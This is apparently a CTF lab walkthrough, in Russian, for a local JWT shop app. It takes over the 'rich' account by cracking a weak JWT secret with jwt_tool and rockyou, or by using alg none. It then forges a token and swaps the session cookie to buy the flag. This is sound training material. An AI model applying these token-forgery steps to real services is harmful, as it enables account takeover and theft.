# Решение JWT Shop Lab

## Цель

Нужно получить доступ к аккаунту пользователя `rich`, купить секретный товар и получить флаг.

## 1. Регистрация на портале

Запускаем приложение:

```bash
sudo docker pull nshkilevich/jwtshop-lab:latest

sudo docker run -d \                           
>  --name jwtshop-lab \
>  -p 127.0.0.1:8084:8080 \
>  nshkilevich/jwtshop-lab:latest
```

Открываем сайт:

```text
http://127.0.0.1:8084
```

Создаём нового пользователя через форму регистрации. После входа попадаем в магазин и видим список товаров.

Среди обычных товаров есть `Секретный флаг`. Он стоит `$1 000 000`, поэтому у нового пользователя с балансом `$10 000` купить его не получится.

## 2. Поиск пользователя с нужной суммой

На странице магазина есть ссылка `Пользователи`.

Переходим на страницу:

```text
http://127.0.0.1:8084/users
```

В таблице видим пользователей и их счета. Среди них есть пользователь:

```text
rich
```

У него на счету `$5 000 000`, значит этого достаточно для покупки флага.

## 3. Поиск JWT в Cookie

Открываем инструменты разработчика в браузере:

- Chrome/Chromium: `F12` или `Ctrl+Shift+I`;
- Firefox: `F12` или `Ctrl+Shift+I`.

Переходим в раздел с cookie:

- Chrome/Chromium: `Application` -> `Cookies` -> `http://127.0.0.1:8084`;
- Firefox: `Storage` -> `Cookies` -> `http://127.0.0.1:8084`.

Видим cookie с именем:

```text
session
```

Её значение похоже на JWT-токен:

```text
xxxxx.yyyyy.zzzzz
```

Копируем значение токена. Дальше будем анализировать его в терминале.

## 4. Установка jwt_tool

Переходим в домашнюю директорию и скачиваем утилиту `jwt_tool`:

```bash
cd ~/
git clone https://github.com/ticarpi/jwt_tool.git
```

Устанавливаем `pip`, если он ещё не установлен:

```bash
sudo apt install python3-pip
```

Создаём отдельное виртуальное окружение для работы:

```bash
mkdir my_ctf_project
cd ~/my_ctf_project
python3 -m venv jwt_venv
source jwt_venv/bin/activate
```

Устанавливаем зависимости:

```bash
cd ~/jwt_tool
pip install termcolor cprint pycryptodomex requests
pip install -r requirements.txt
```

После завершения работы из виртуального окружения можно выйти командой:

```bash
deactivate
```

## 5. Анализ токена

Переходим в директорию с `jwt_tool`:

```bash
cd ~/jwt_tool
```

Смотрим содержимое токена:

```bash
python3 jwt_tool.py <токен>
```

В расшифрованном содержимом можно увидеть поле:

```json
{
  "login": "ваш_логин"
}
```

Это важная находка. Она означает, что сервер определяет текущего пользователя по значению `login`, которое лежит внутри JWT.

Если подменить `login` на `rich` и сделать так, чтобы сервер принял новый токен, можно попасть в аккаунт пользователя `rich`.

## 6. Проверка возможных атак

Проверяем токен на известные варианты атак:

```bash
python3 jwt_tool.py <токен> -X a
```

Утилита может показать, что доступна атака `alg none`.

Важно: атака `alg none` не требует подбора пароля. В таком варианте нужно создать новый токен, в заголовке которого поле `alg` будет иметь значение `none`, а в payload поле `login` будет заменено на `rich`.

Однако для тренировки работы с `jwt_tool` дополнительно попробуем подобрать секрет подписи JWT.

## 7. Подбор секрета JWT

Для подбора используем словарь `rockyou.txt`:

```bash
python3 jwt_tool.py <токен> --crack -d /usr/share/wordlists/rockyou.txt
```

В этом задании секрет слабый, поэтому он должен быть найден. Теперь мы знаем пароль, которым подписывается JWT.

## 8. Создание поддельного токена

Создаём изменённый токен. Нужно заменить поле `login` на:

```text
rich
```

Для интерактивного редактирования токена можно использовать:

```bash
python3 jwt_tool.py <токен> -T -S hs256 -p <пароль>
```

В режиме редактирования меняем payload так, чтобы получилось:

```json
{
  "login": "rich"
}
```

После этого `jwt_tool` сформирует новый JWT, подписанный найденным секретом.

Также можно было использовать вариант с `alg none`, если сервер принимает такие токены. В этом случае пароль подбирать не нужно: достаточно создать JWT с `alg: none` и payload с `login: rich`.

## 9. Подмена cookie и покупка флага

Возвращаемся на сайт и снова открываем cookie.

В cookie `session` вставляем новый JWT-токен, в котором указан пользователь `rich`.

Обновляем страницу магазина. Если токен принят, в блоке пользователя будет показано:

```text
rich
```

Теперь баланс берётся из базы данных для пользователя `rich`, поэтому денег достаточно.

Нажимаем кнопку покупки у товара `Секретный флаг`.

После успешной покупки приложение показывает флаг:

```text
CTF{...}
```

## Почему атака сработала

JWT подписан слишком слабым секретом `chelsea`, который можно подобрать по словарю. После подбора секрета злоумышленник может создать новый валидный токен и указать в нём другой логин.

Сервер доверяет полю `login` из JWT и на его основе выбирает пользователя из базы данных. Поэтому подмена `login` на `rich` приводит к входу в аккаунт богатого пользователя.
